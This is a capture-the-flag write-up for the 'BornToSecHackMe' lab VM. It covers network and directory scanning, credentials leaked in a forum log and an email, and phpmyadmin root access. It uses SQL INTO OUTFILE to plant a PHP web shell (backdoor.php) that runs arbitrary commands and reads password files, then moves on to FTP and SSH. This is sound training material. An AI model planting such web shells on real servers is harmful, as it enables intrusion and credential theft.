#Writeup 1

First step is to get the ip of the vm.

nmap 192.168.1.0-255

Nmap scan report for borntosechackme.home (192.168.1.37)
Host is up (0.00049s latency).
Not shown: 994 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

A web page is available at this address.

In order to learn more about other paths we use dirb.

cd Applications/dirb222

dirb https://192.168.1.37 wordlists/common.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Apr 29 13:14:57 2021
URL_BASE: https://192.168.1.37/
WORDLIST_FILES: wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://192.168.1.37/ ----
+ https://192.168.1.37/cgi-bin/ (CODE:403|SIZE:289)                                                                             
==> DIRECTORY: https://192.168.1.37/forum/                                                                                      
==> DIRECTORY: https://192.168.1.37/phpmyadmin/                                                                                 
+ https://192.168.1.37/server-status (CODE:403|SIZE:294)                                                                        
==> DIRECTORY: https://192.168.1.37/webmail/ 


After searching through the results, a page in particular caught our attention :

forum/index.php -> Probleme login ?

https://192.168.1.37/forum/index.php?mode=thread&id=6

We notice this :

Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2

A user called lmezard tried to use his password as his username to login.

Using those credentials, we log in the forum as lmezard.


Checking user information, we have an email address : laurie@borntosec.net

Let's use it to connect to https://192.168.1.37/webmail/.

We get the password in a mail allowing us to access the database at https://192.168.1.37/phpmyadmin/

root
Fg-'kKXBj87E:aJ$


From there we can execute SQL requests.
By reading this tutorial : https://github.com/ilosuna/mylittleforum, we understand there is a file which we can use to execute cli commands.
Let's run this request : SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php";

Running a test : https://192.168.1.37/forum/templates_c/backdoor.php?cmd=pwd

We can see that pwd was executed and we can see the current path.

Let's list the files : https://192.168.1.37/forum/templates_c/backdoor.php?cmd=ls%20 /home

LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz


Let's display LOOKATME : https://192.168.1.37/forum/templates_c/backdoor.php?cmd=cat%20 /home/LOOKATME/password

lmezard:G!@M6f4Eatau{sF"


It doesn't work with ssh but works with ftp.

ftp lmezard@192.168.1.37
Connected to 192.168.1.37.
220 Welcome on this server
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp>


Get the files.

get README
get fun

cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh

Upon inspecting the file fun, we notice calls to getme() function.

The first characters are easy to get but the other ones are a bit tricky.

To simplify the search, simply search for "return " and we find every character that we need and then sort them by the order each function is called.

After searching, we get the string Iheartpwnage and we use sha256 on it, giving us : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

We can now connect with ssh on the vm as user laurie.

ssh laurie@192.168.1.37



















